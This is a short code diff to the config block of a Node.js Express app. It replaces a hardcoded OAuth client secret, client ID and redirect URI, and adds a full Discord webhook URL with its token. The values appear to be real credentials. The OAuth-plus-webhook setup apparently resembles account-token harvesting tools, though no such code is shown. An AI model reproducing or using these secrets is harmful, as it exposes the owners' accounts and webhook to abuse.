@@ -1,8 +1,8 @@
 //Config
-const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://d-na.herokuapp.com/'
-const webhook_url = 'webhook'
+const secret_value = '4Zy8Q~rY4ylc2Fd7Rc7UGaRGLsGIGRlwvKUbQbH1'
+const client_id = '17d3ec78-1b21-4a0e-bc04-f438a0d93886'
+const redirect_uri = 'https://goofstersguildauth.onrender.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1230242394364973156/29cUr4wjY3YekOeyFPeTFiYrYlJiqVX12w5k-CrqurJtKDOy8tjK59FjA5Op5r1NumvT'
 //Requirements
 const axios = require('axios')
 const express = require('express')
